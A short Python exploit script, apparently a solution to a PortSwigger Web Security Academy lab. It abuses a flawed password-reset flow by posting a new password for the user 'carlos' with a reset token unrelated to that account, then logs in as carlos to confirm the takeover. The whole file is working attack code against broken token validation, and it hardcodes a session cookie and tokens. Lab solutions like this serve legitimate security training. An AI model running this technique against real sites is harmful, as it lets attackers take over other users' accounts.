import requests

DOMAIN = "0a4f0095034c575784ecfc4300a100bc.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/forgot-password?temp-forgot-password-token=y1mx7mlzfooyunf06fg8fuwe54g6muz6",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
}

COOKIES = {
    "session": "nt2iwTwnJuxEQrt0jhdoOqIwiIXru1VX"
}

def request_new_password(username, reset_token):
    url = f"https://{DOMAIN}/forgot-password?temp-forgot-password-token={reset_token}"
    data = {
        "username": username,
        "new-password-1": "peter",
        "new-password-2": "peter",
        "temp-forgot-password-token": reset_token
    }

    response = requests.post(url, headers=HEADERS, cookies=COOKIES, data=data)

def login(username, password):
    url = f"https://{DOMAIN}/login"
    data = {
        "username": username,
        "password": password
    }

    response = requests.post(url, headers=HEADERS, cookies=COOKIES, data=data)
    if "Your username is" in response.text:
        print(f"Logged in as {username}!")

request_new_password("carlos", "2gfisxr3g7k81pmxll0l7o26stowatf1")
login("carlos", "peter")